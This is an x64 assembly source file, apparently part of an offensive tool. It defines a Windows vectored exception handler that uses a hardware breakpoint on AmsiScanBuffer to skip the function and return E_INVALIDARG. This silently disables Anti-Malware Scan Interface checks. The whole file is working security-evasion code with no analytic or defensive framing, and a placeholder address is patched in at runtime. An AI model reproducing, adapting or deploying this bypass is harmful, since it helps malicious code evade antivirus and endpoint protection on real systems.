[BITS 64]

VehHandler:
    mov r8, [rcx + 8]          ; r8 = PCONTEXT
    mov r9, [rcx]              ; r9 = PEXCEPTION_RECORD
    mov eax, dword [r9]        ; eax = ExceptionCode

    cmp eax, 0x80000003        ; EXCEPTION_BREAKPOINT (int3)
    je handle_int3

    cmp eax, 0x80000004        ; EXCEPTION_SINGLE_STEP (HWBP)
    je handle_hwbp

    xor eax, eax               ; EXCEPTION_CONTINUE_SEARCH
    ret

handle_int3:
    lea r10, [rel AmsiTarget]
    mov r10, [r10]
    mov [r8 + 0x48], r10       ; ContextRecord->Dr0 = pAmsiScanBuffer
    mov qword [r8 + 0x60], 1   ; ContextRecord->Dr7 = 1 (Enable local DR0)
    add qword [r8 + 0xF8], 1   ; ContextRecord->Rip += 1 (Skip int3)
    mov eax, -1                ; EXCEPTION_CONTINUE_EXECUTION
    ret

handle_hwbp:
    mov r11, [r8 + 0xF8]       ; ContextRecord->Rip
    lea r10, [rel AmsiTarget]
    mov r10, [r10]
    cmp r11, r10
    jne not_our_hwbp           ; If not AmsiScanBuffer, pass to next handler

    mov dword [r8 + 0x78], 0x80070057 ; ContextRecord->Rax = E_INVALIDARG
    mov r11, [r8 + 0x98]       ; ContextRecord->Rsp
    mov r10, [r11]             ; Get Return Address from stack
    mov [r8 + 0xF8], r10       ; ContextRecord->Rip = Return Address
    add qword [r8 + 0x98], 8   ; ContextRecord->Rsp += 8
    mov eax, -1                ; EXCEPTION_CONTINUE_EXECUTION
    ret

not_our_hwbp:
    xor eax, eax               ; EXCEPTION_CONTINUE_SEARCH
    ret

align 8
AmsiTarget:
    dq 0xAAAAAAAAAAAAAAAA      ; Placeholder for pAmsiScanBuffer